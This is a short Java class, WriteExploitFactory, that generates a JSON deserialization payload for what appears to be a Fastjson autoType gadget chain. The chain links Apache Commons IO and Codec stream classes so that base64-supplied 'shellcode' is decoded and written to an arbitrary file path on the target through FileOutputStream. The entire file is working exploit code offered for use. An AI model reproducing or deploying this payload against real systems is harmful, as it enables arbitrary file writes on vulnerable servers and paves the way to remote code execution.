public class WriteExploitFactory {
    public static String generate(String b64Shellcode) {
        String bomsString = "0, ".repeat(b64Shellcode.length());
        bomsString = bomsString.substring(0, bomsString.length() - 2);

        return  "{\n" +
                "  \"abc\":{\"@type\": \"java.lang.AutoCloseable\",\n" +
                "         \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "         \"delegate\": {\"@type\": \"org.apache.commons.io.input.TeeInputStream\",\n" +
                "                      \"input\":{\"@type\": \"org.apache.commons.codec.binary.Base64InputStream\",\n" +
                "                                 \"in\":{\"@type\": \"org.apache.commons.io.input.CharSequenceInputStream\",\n" +
                "                                              \"cs\": \"" + b64Shellcode + "\",\n" +
                "                                              \"charset\": \"UTF-8\" },\n" +
                "                       },\n" +
                "                      \"branch\":{\"@type\": \"java.io.FileOutputStream\",\n" +
                "                                 \"name\": \"c:/Test/something.txt\" },\n" +
                "         },\n" +
                "         \"boms\": [{\"bytes\":[" + bomsString + "], \"charsetName\":\"myBom\"}]\n" +
                "        },\n" +
                "  \"address\" : {\"$ref\":\"$.abc.BOM\"}\n" +
                "}";
    }
}
